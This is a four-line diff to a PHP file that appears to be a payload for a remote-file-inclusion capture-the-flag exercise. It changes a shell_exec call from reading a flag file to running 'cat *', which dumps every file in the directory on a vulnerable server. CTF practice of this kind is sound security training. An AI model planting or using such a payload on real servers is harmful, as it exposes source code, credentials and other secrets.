@@ -1,4 +1,4 @@
 <?php
-$output = shell_exec('cat /var/www/html/rfi1/flag.php');
+$output = shell_exec('cat *');
 echo "<pre>$output</pre>";
 ?>
